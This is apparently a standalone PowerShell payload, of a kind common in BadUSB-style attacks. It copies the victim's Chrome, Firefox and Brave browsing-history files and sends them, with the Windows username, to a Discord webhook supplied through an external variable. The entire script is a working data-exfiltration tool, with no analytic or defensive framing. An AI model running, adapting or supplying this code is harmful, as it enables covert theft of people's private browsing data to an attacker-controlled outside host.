function Upload-Discord {
  [CmdletBinding()]
  param (
      [parameter(Position=0, Mandatory=$False)]
      [string]$file,
      [parameter(Position=1, Mandatory=$False)]
      [string]$text
  )

  $hookurl = "$dc"

  # If file exists, we send both text and file
  if (-not ([string]::IsNullOrEmpty($file)) -and (Test-Path $file)) {
      try {
          # Copy the file to a temporary location to avoid "file in use" errors
          $tempFile = [System.IO.Path]::GetTempFileName()
          Copy-Item $file $tempFile -Force

          $boundary = [System.Guid]::NewGuid().ToString()

          # Create multipart form data
          $BodyLines = @(
              "--$boundary",
              "Content-Disposition: form-data; name=`"content`"",
              "",
              "$text",
              "--$boundary",
              "Content-Disposition: form-data; name=`"file1`"; filename=`"$(Split-Path -Leaf $file)`"",
              "Content-Type: application/octet-stream",
              "",
              [System.IO.File]::ReadAllText($tempFile),
              "--$boundary--"
          )

          $Body = $BodyLines -join "`r`n"
          $Headers = @{
              "Content-Type" = "multipart/form-data; boundary=$boundary"
          }

          # Send request to Discord
          Invoke-RestMethod -Uri $hookurl -Method Post -Body $Body -Headers $Headers

          # Clean up the temporary file after upload
          Remove-Item $tempFile -Force

      } catch {
          Write-Host "Error reading or uploading file: $_"
          # Send only the text if the file could not be processed
          $Body = @{
              "username" = $env:username
              "content" = "$text (file upload failed)"
          }
          Invoke-RestMethod -Uri $hookurl -Method Post -ContentType 'application/json' -Body ($Body | ConvertTo-Json)
      }
  }
  else {
      # Send just the text if the file is not provided or doesn't exist
      $Body = @{
          "username" = $env:username
          "content" = $text
      }

      Invoke-RestMethod -Uri $hookurl -Method Post -ContentType 'application/json' -Body ($Body | ConvertTo-Json)
  }
}


# Variables for file paths
$user = $env:username
$historyPaths = @{
    "Google Chrome History" = "C:\Users\$user\AppData\Local\Google\Chrome\User Data\Default\History"
    "Firefox History" = "C:\Users\$user\AppData\Roaming\Mozilla\Firefox\Profiles"
    "Brave History" = "C:\Users\$user\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
}

# Send a message with the username and a separator line
Upload-Discord -text "---------------------------------"
Upload-Discord -text "User: $user"
Upload-Discord -text "---------------------------------"

# Loop through each browser and check for history files
foreach ($browser in $historyPaths.Keys) {
    $path = $historyPaths[$browser]
    
    if (Test-Path $path) {
        Upload-Discord -file $path -text "$browser :"
    } else {
        Upload-Discord -text "$browser : NOT FOUND"
    }
}
